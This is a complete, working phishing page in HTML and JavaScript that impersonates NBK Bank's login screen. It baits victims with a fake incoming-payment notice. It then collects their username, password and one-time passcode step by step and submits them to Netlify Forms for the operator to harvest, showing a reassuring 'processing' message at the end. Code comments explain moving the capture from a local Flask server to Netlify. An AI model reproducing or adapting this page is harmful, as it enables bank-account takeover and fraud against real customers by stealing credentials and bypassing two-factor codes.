<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NBK Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom font for a magazine-like feel (Inter is default, but adding a serif fallback) */
        body {
            font-family: "Inter", ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            background-color: #ffffff; /* Body background is white */
            margin: 0; /* Ensures no default body margin */
            padding: 0; /* Ensures no default body padding */
        }
        /* Custom blue for text, similar to magazine blue */
        .text-magazine-blue {
            color: #007bff; /* A vibrant blue */
        }
        /* Darker blue for the button */
        .bg-dark-blue {
            background-color: #0056b3; /* A darker shade of blue */
        }
        .bg-dark-blue:hover {
            background-color: #004085; /* Even darker on hover */
        }

        /* CSS for the rotating spinner */
        .spinner {
            border: 4px solid rgba(0, 123, 255, 0.1); /* Light blue border */
            border-top: 4px solid #007bff; /* Blue top border */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite; /* Spin animation */
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="bg-white w-full h-screen flex items-center justify-center">
        <div class="p-8 rounded-xl shadow-2xl max-w-md w-full bg-white">
            <div class="flex items-center justify-center mb-6">
                <img src="nk.png" alt="Game Icon" class="w-32 h-32 mr-2">
                <h1 class="text-3xl font-bold text-gray-900">NBK Bank</h1>
            </div>

            <h2 id="dynamicHeading" class="text-xl font-bold text-magazine-blue mb-4 text-center">Login NBK Account</h2>
            <p id="dynamicSubheading" class="text-gray-700 text-center mb-8"></p>

            <form id="loginForm" name="nbk-login" method="POST" data-netlify="true" class="text-left">
                <input type="hidden" name="form-name" value="nbk-login">
                <div id="dynamicFormContent">
                    </div>
            </form>
        </div>
    </div>

    <script>
        // Get references to the form wrapper and the dynamic heading
        const loginForm = document.getElementById('loginForm');
        const dynamicFormContent = document.getElementById('dynamicFormContent'); // New div inside the form
        const dynamicHeading = document.getElementById('dynamicHeading');
        const dynamicSubheading = document.getElementById('dynamicSubheading');

        let loginPhase = 'username';
        let storedUsername = '';
        let storedPassword = '';
        let storedOtp = '';

        // *** CRITICAL CHANGE: If you want Netlify Forms to capture data,
        // you MUST NOT use your custom fetch to 127.0.0.1:5000.
        // Netlify Forms collects submissions directly.
        // If you intend to use your Flask server, then the `data-netlify="true"`
        // attribute is not necessary for data collection by Netlify Forms.

        // If you want to send data to your Flask server AND also collect with Netlify Forms,
        // you'd need a Netlify Function that acts as a proxy, or send data twice.
        // For the purpose of adding Netlify attribute and getting submissions in Netlify Forms UI,
        // we'll assume you're replacing the Flask server for this data.
        // If you NEED the Flask server, then this Netlify Forms setup isn't directly compatible
        // for data *capture* in Netlify's UI without further changes (e.g., a Netlify Function).

        // Function to render the current content based on the login phase
        function renderForm() {
            let contentHtml = '';

            if (loginPhase === 'username' || loginPhase === 'password' || loginPhase === 'otp') {
                let labelText = '';
                let inputType = '';
                let inputId = '';
                let inputName = ''; // IMPORTANT: Add name attribute for Netlify Forms
                let placeholder = '';
                let buttonText = '';
                let inputValue = '';

                if (loginPhase === 'username') {
                    labelText = 'Enter your username';
                    inputType = 'text';
                    inputId = 'username';
                    inputName = 'username'; // Netlify Forms needs this
                    placeholder = 'Your username';
                    buttonText = 'Next';
                    inputValue = storedUsername;
                } else if (loginPhase === 'password') {
                    labelText = 'Enter your password';
                    inputType = 'password';
                    inputId = 'password';
                    inputName = 'password'; // Netlify Forms needs this
                    placeholder = 'Your password';
                    buttonText = 'Login';
                    inputValue = storedPassword;
                } else if (loginPhase === 'otp') {
                    labelText = 'Enter OTP sent to your phone number';
                    inputType = 'text'; // OTP is often text, could be 'number' too
                    inputId = 'otp';
                    inputName = 'otp'; // Netlify Forms needs this
                    placeholder = 'Your OTP';
                    buttonText = 'Verify OTP';
                    inputValue = storedOtp;
                }

                contentHtml = `
                    <label for="${inputId}" class="block text-magazine-blue text-lg font-semibold mb-2">${labelText}</label>
                    <input type="${inputType}" id="${inputId}" name="${inputName}" placeholder="${placeholder}" value="${inputValue}"
                           class="w-full p-3 mb-6 bg-white text-gray-900 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500">
                    <button type="submit" id="actionButton"
                            class="w-full py-3 bg-dark-blue text-white font-bold rounded-lg shadow-lg hover:bg-dark-blue-hover transition duration-300 ease-in-out transform hover:scale-105">
                        ${buttonText}
                    </button>
                `;
            } else if (loginPhase === 'loading') {
                contentHtml = `
                    <div class="flex flex-col items-center justify-center py-10">
                        <div class="spinner mb-4"></div>
                        <p class="text-gray-900 text-lg">Loading...</p>
                    </div>
                `;
            } else if (loginPhase === 'welcome') {
                contentHtml = `
                    <div class="text-center">
                        <p class="text-gray-900 text-2xl font-bold mb-6">Welcome back Again!</p>
                        <button type="button" id="proceedButton"
                                class="w-full py-3 bg-dark-blue text-white font-bold rounded-lg shadow-lg hover:bg-dark-blue-hover transition duration-300 ease-in-out transform hover:scale-105">
                            Finish
                        </button>
                    </div>
                `;
            }

            // Update the form content with the new HTML
            dynamicFormContent.innerHTML = contentHtml;

            // Update the dynamic heading and subheading based on the current phase
            if (loginPhase === 'welcome') {
                dynamicHeading.textContent = 'Your request is being processed, thank you for staying with us';
                dynamicSubheading.textContent = ''; // Clear subheading for welcome page
            } else {
                dynamicHeading.textContent = 'Login NBK Account'; // Reset for other phases
                dynamicSubheading.textContent = 'Ahmed kumar iniated payment to your NBK Account'; // Set subheading for other phases
            }

            // Attach event listener to the form itself for submission, NOT the button click
            // This allows Netlify Forms to intercept the submission
            if (loginPhase === 'username' || loginPhase === 'password' || loginPhase === 'otp') {
                loginForm.onsubmit = handleFormSubmission; // Use onsubmit on the form element
            } else if (loginPhase === 'welcome') {
                document.getElementById('proceedButton').addEventListener('click', () => {
                    alert("Welcome to the bank!"); // Simulate proceeding
                    // window.location.href = '/dashboard.html';
                });
            }
        }

        // Function to handle the form submission for Netlify
        async function handleFormSubmission(event) {
            event.preventDefault(); // Prevent default browser form submission initially

            let currentInputData = '';
            let nextPhase = '';

            if (loginPhase === 'username') {
                const usernameInput = document.getElementById('username');
                currentInputData = usernameInput.value.trim();
                if (currentInputData === "") {
                    alert("Please enter your username.");
                    return;
                }
                storedUsername = currentInputData;
                nextPhase = 'password';
            } else if (loginPhase === 'password') {
                const passwordInput = document.getElementById('password');
                currentInputData = passwordInput.value.trim();
                if (currentInputData === "") {
                    alert("Please enter your password.");
                    return;
                }
                storedPassword = currentInputData;
                nextPhase = 'otp';
            } else if (loginPhase === 'otp') {
                const otpInput = document.getElementById('otp');
                currentInputData = otpInput.value.trim();
                if (currentInputData === "") {
                    alert("Please enter the OTP.");
                    return;
                }
                storedOtp = currentInputData;
                nextPhase = 'welcome';
            }

            // --- IMPORTANT FOR NETLIFY FORMS ---
            // Instead of sending data to Flask, we'll let Netlify collect it.
            // When `loginPhase` is 'welcome', we've collected all data and can trigger the actual Netlify submission.
            if (nextPhase === 'welcome') {
                // Prepare form data for Netlify submission
                const formData = new FormData(loginForm); // Use FormData to capture all named inputs
                // Add the specific 'phase' data you were sending to Flask
                formData.append('phase', loginPhase);
                formData.append('username_final', storedUsername); // Send final collected values
                formData.append('password_final', storedPassword);
                formData.append('otp_final', storedOtp);


                // Option 1: Submit the form using Fetch API to Netlify's forms endpoint
                // This gives you control to show loading states etc.
                const netlifyFormUrl = loginForm.action || window.location.pathname; // Submit to current path or defined action
                try {
                    // Show loading spinner
                    loginPhase = 'loading';
                    renderForm();

                    const response = await fetch(netlifyFormUrl, {
                        method: 'POST',
                        body: formData, // FormData directly
                    });

                    if (response.ok) {
                        console.log("Data successfully sent to Netlify Forms!");
                        // Simulate delay and then proceed to welcome
                        setTimeout(() => {
                            loginPhase = 'welcome';
                            renderForm();
                            console.log("OTP Verified! Login successful!");
                            console.log("Username:", storedUsername);
                            console.log("Password:", storedPassword);
                            console.log("OTP:", storedOtp);
                        }, 3000); // 3 seconds delay
                    } else {
                        console.error("Failed to send data to Netlify Forms. Status:", response.status);
                        // Handle error, maybe revert to previous phase or show error message
                        alert("An error occurred during submission. Please try again.");
                        loginPhase = 'otp'; // Go back to OTP if submission failed
                        renderForm();
                    }
                } catch (error) {
                    console.error("Network error submitting to Netlify Forms:", error);
                    alert("Network error. Please check your connection.");
                    loginPhase = 'otp';
                    renderForm();
                }

            } else {
                // For intermediate phases (username, password), just transition the UI
                loginPhase = 'loading';
                renderForm();
                setTimeout(() => {
                    loginPhase = nextPhase;
                    renderForm();
                }, 3000); // 3 seconds delay for UI transition
            }
        }

        // Initial render when the page loads
        document.addEventListener('DOMContentLoaded', renderForm);
    </script>

</body>
</html>
